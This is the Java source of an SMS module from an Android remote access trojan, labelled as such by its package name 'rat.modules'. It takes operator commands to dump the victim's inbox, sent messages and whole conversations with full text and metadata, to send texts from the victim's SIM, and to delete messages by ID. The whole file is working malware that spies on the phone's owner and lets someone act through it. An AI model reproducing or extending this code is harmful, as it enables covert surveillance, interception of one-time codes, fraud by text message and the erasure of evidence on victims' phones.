package com.fly0rakoon.rat.modules;

import android.Manifest;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.content.ContextCompat;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class SmsModule {
    
    private static final String TAG = "SmsModule";
    
    // SMS Content URIs
    private static final Uri SMS_URI = Uri.parse("content://sms");
    private static final Uri SMS_INBOX_URI = Uri.parse("content://sms/inbox");
    private static final Uri SMS_SENT_URI = Uri.parse("content://sms/sent");
    private static final Uri SMS_DRAFT_URI = Uri.parse("content://sms/draft");
    private static final Uri SMS_OUTBOX_URI = Uri.parse("content://sms/outbox");
    
    private Context context;
    private SmsManager smsManager;
    
    public SmsModule(Context context) {
        this.context = context;
        this.smsManager = SmsManager.getDefault();
    }
    
    public String handleCommand(String args) {
        if (args.isEmpty()) {
            return getSmsList("inbox", 50); // Default: last 50 SMS from inbox
        }
        
        String[] parts = args.split(" ", 2);
        String subCommand = parts[0].toLowerCase();
        String subArgs = parts.length > 1 ? parts[1] : "";
        
        switch (subCommand) {
            case "list":
            case "get":
                return getSmsList(subArgs, 50);
                
            case "inbox":
                return getSmsList("inbox", 50);
                
            case "sent":
                return getSmsList("sent", 50);
                
            case "conversation":
                return getConversation(subArgs);
                
            case "send":
                return sendSms(subArgs);
                
            case "delete":
                return deleteSms(subArgs);
                
            case "count":
                return getSmsCount();
                
            default:
                return "Usage: sms [list|inbox|sent|conversation|send|delete|count] [args]";
        }
    }
    
    private String getSmsList(String type, int limit) {
        if (!checkSmsReadPermission()) {
            return "ERROR: SMS read permission not granted";
        }
        
        Uri uri;
        switch (type.toLowerCase()) {
            case "inbox":
                uri = SMS_INBOX_URI;
                break;
            case "sent":
                uri = SMS_SENT_URI;
                break;
            case "draft":
                uri = SMS_DRAFT_URI;
                break;
            case "outbox":
                uri = SMS_OUTBOX_URI;
                break;
            default:
                uri = SMS_URI;
        }
        
        StringBuilder result = new StringBuilder();
        result.append("SMS ").append(type).append(" (last ").append(limit).append("):\n");
        result.append("=".repeat(40)).append("\n");
        
        String[] projection = {
            "_id", "thread_id", "address", "person", "date", "date_sent",
            "protocol", "read", "status", "type", "subject", "body",
            "service_center", "locked", "sub_id"
        };
        
        String sortOrder = "date DESC LIMIT " + limit;
        
        try (Cursor cursor = context.getContentResolver().query(
            uri, projection, null, null, sortOrder)) {
            
            if (cursor == null) {
                return "ERROR: Could not query SMS database";
            }
            
            int count = 0;
            while (cursor.moveToNext()) {
                count++;
                result.append(formatSms(cursor)).append("\n");
                result.append("-".repeat(40)).append("\n");
            }
            
            if (count == 0) {
                return "No SMS messages found";
            }
            
            result.append("Total: ").append(count).append(" messages");
            
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception: " + e.getMessage());
            return "ERROR: Security exception accessing SMS";
        } catch (Exception e) {
            Log.e(TAG, "Error getting SMS: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
        
        return result.toString();
    }
    
    private String getConversation(String threadId) {
        if (!checkSmsReadPermission()) {
            return "ERROR: SMS read permission not granted";
        }
        
        if (threadId.isEmpty()) {
            return "Usage: sms conversation <thread_id>";
        }
        
        StringBuilder result = new StringBuilder();
        result.append("Conversation (Thread ").append(threadId).append("):\n");
        result.append("=".repeat(40)).append("\n");
        
        String selection = "thread_id = ?";
        String[] selectionArgs = {threadId};
        String sortOrder = "date ASC";
        
        String[] projection = {
            "_id", "address", "date", "body", "type"
        };
        
        try (Cursor cursor = context.getContentResolver().query(
            SMS_URI, projection, selection, selectionArgs, sortOrder)) {
            
            if (cursor == null) {
                return "ERROR: Could not query conversation";
            }
            
            int count = 0;
            while (cursor.moveToNext()) {
                count++;
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                long date = cursor.getLong(cursor.getColumnIndex("date"));
                int type = cursor.getInt(cursor.getColumnIndex("type"));
                
                String direction = (type == 1) ? "RECEIVED" : "SENT";
                String dateStr = formatDate(date);
                
                result.append("[").append(dateStr).append("] ")
                      .append(direction).append(" - ").append(address).append(":\n");
                result.append(body).append("\n\n");
            }
            
            if (count == 0) {
                return "No messages in this conversation";
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting conversation: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
        
        return result.toString();
    }
    
    private String sendSms(String args) {
        if (!checkSmsSendPermission()) {
            return "ERROR: SMS send permission not granted";
        }
        
        // Parse arguments: phone number and message
        String[] parts = args.split(" ", 2);
        if (parts.length < 2) {
            return "Usage: sms send <phone_number> <message>";
        }
        
        String phoneNumber = parts[0];
        String message = parts[1];
        
        try {
            // Send SMS
            ArrayList<String> messageParts = smsManager.divideMessage(message);
            
            // Get default SIM for SMS (if dual SIM)
            int defaultSmsSubId = getDefaultSmsSubscriptionId();
            if (defaultSmsSubId != -1) {
                SmsManager smsManager = SmsManager.getSmsManagerForSubscriptionId(defaultSmsSubId);
                smsManager.sendMultipartTextMessage(phoneNumber, null, messageParts, null, null);
            } else {
                smsManager.sendMultipartTextMessage(phoneNumber, null, messageParts, null, null);
            }
            
            // Save to sent folder
            saveSentMessage(phoneNumber, message);
            
            Log.d(TAG, "SMS sent to " + phoneNumber);
            return "OK: SMS sent to " + phoneNumber;
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending SMS: " + e.getMessage());
            return "ERROR: Failed to send SMS - " + e.getMessage();
        }
    }
    
    private String deleteSms(String smsId) {
        if (!checkSmsWritePermission()) {
            return "ERROR: SMS write permission not granted";
        }
        
        if (smsId.isEmpty()) {
            return "Usage: sms delete <sms_id>";
        }
        
        try {
            String selection = "_id = ?";
            String[] selectionArgs = {smsId};
            
            int deleted = context.getContentResolver().delete(
                SMS_URI, selection, selectionArgs);
            
            if (deleted > 0) {
                return "OK: Deleted SMS " + smsId;
            } else {
                return "ERROR: SMS " + smsId + " not found";
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error deleting SMS: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
    }
    
    private String getSmsCount() {
        if (!checkSmsReadPermission()) {
            return "ERROR: SMS read permission not granted";
        }
        
        StringBuilder result = new StringBuilder();
        result.append("SMS Count:\n");
        
        String[] projection = {"COUNT(*)"};
        
        try {
            // Total SMS
            try (Cursor cursor = context.getContentResolver().query(
                SMS_URI, projection, null, null, null)) {
                if (cursor != null && cursor.moveToFirst()) {
                    result.append("  Total: ").append(cursor.getInt(0)).append("\n");
                }
            }
            
            // Inbox count
            try (Cursor cursor = context.getContentResolver().query(
                SMS_INBOX_URI, projection, null, null, null)) {
                if (cursor != null && cursor.moveToFirst()) {
                    result.append("  Inbox: ").append(cursor.getInt(0)).append("\n");
                }
            }
            
            // Sent count
            try (Cursor cursor = context.getContentResolver().query(
                SMS_SENT_URI, projection, null, null, null)) {
                if (cursor != null && cursor.moveToFirst()) {
                    result.append("  Sent: ").append(cursor.getInt(0)).append("\n");
                }
            }
            
            // Draft count
            try (Cursor cursor = context.getContentResolver().query(
                SMS_DRAFT_URI, projection, null, null, null)) {
                if (cursor != null && cursor.moveToFirst()) {
                    result.append("  Draft: ").append(cursor.getInt(0)).append("\n");
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error counting SMS: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
        
        return result.toString();
    }
    
    private void saveSentMessage(String address, String body) {
        if (!checkSmsWritePermission()) {
            return;
        }
        
        try {
            ContentValues values = new ContentValues();
            values.put("address", address);
            values.put("body", body);
            values.put("date", System.currentTimeMillis());
            values.put("type", 2); // Type 2 = SENT
            
            context.getContentResolver().insert(SMS_SENT_URI, values);
            
        } catch (Exception e) {
            Log.e(TAG, "Error saving sent message: " + e.getMessage());
        }
    }
    
    private String formatSms(Cursor cursor) {
        StringBuilder sb = new StringBuilder();
        
        int idIndex = cursor.getColumnIndex("_id");
        int addressIndex = cursor.getColumnIndex("address");
        int dateIndex = cursor.getColumnIndex("date");
        int dateSentIndex = cursor.getColumnIndex("date_sent");
        int typeIndex = cursor.getColumnIndex("type");
        int bodyIndex = cursor.getColumnIndex("body");
        int readIndex = cursor.getColumnIndex("read");
        int threadIdIndex = cursor.getColumnIndex("thread_id");
        int subIdIndex = cursor.getColumnIndex("sub_id");
        
        String id = getString(cursor, idIndex, "");
        String address = getString(cursor, addressIndex, "Unknown");
        long date = getLong(cursor, dateIndex, 0);
        long dateSent = getLong(cursor, dateSentIndex, 0);
        int type = getInt(cursor, typeIndex, 0);
        String body = getString(cursor, bodyIndex, "");
        int read = getInt(cursor, readIndex, 0);
        String threadId = getString(cursor, threadIdIndex, "");
        int subId = getInt(cursor, subIdIndex, 0);
        
        String direction;
        switch (type) {
            case 1: direction = "RECEIVED"; break;
            case 2: direction = "SENT"; break;
            case 3: direction = "DRAFT"; break;
            case 4: direction = "OUTBOX"; break;
            case 5: direction = "FAILED"; break;
            case 6: direction = "QUEUED"; break;
            default: direction = "UNKNOWN";
        }
        
        String dateStr = formatDate(date);
        String sentDateStr = (dateSent > 0) ? formatDate(dateSent) : "N/A";
        String readStatus = (read == 1) ? "Read" : "Unread";
        
        sb.append("ID: ").append(id).append("\n");
        sb.append("Thread: ").append(threadId).append("\n");
        sb.append("From/To: ").append(address).append("\n");
        sb.append("Type: ").append(direction).append(" (").append(readStatus).append(")\n");
        sb.append("Date: ").append(dateStr).append("\n");
        if (dateSent > 0) {
            sb.append("Sent: ").append(sentDateStr).append("\n");
        }
        if (subId > 0) {
            sb.append("SIM: ").append(subId).append("\n");
        }
        sb.append("Message: ").append(body);
        
        return sb.toString();
    }
    
    private int getDefaultSmsSubscriptionId() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP_MR1) {
            try {
                SubscriptionManager subscriptionManager = (SubscriptionManager) 
                    context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
                
                if (subscriptionManager != null) {
                    List<SubscriptionInfo> subscriptionInfoList = 
                        subscriptionManager.getActiveSubscriptionInfoList();
                    
                    if (subscriptionInfoList != null && !subscriptionInfoList.isEmpty()) {
                        // Get default SMS subscription
                        int defaultSmsSubId = SubscriptionManager.getDefaultSmsSubscriptionId();
                        return defaultSmsSubId;
                    }
                }
            } catch (SecurityException e) {
                Log.e(TAG, "Security exception getting subscription: " + e.getMessage());
            }
        }
        return -1;
    }
    
    private boolean checkSmsReadPermission() {
        return ContextCompat.checkSelfPermission(context, 
            Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
    }
    
    private boolean checkSmsSendPermission() {
        return ContextCompat.checkSelfPermission(context, 
            Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED;
    }
    
    private boolean checkSmsWritePermission() {
        return ContextCompat.checkSelfPermission(context, 
            Manifest.permission.WRITE_SMS) == PackageManager.PERMISSION_GRANTED;
    }
    
    private String getString(Cursor cursor, int index, String defaultValue) {
        if (index != -1) {
            return cursor.getString(index);
        }
        return defaultValue;
    }
    
    private long getLong(Cursor cursor, int index, long defaultValue) {
        if (index != -1) {
            return cursor.getLong(index);
        }
        return defaultValue;
    }
    
    private int getInt(Cursor cursor, int index, int defaultValue) {
        if (index != -1) {
            return cursor.getInt(index);
        }
        return defaultValue;
    }
    
    private String formatDate(long timestamp) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
        return sdf.format(new Date(timestamp));
    }
}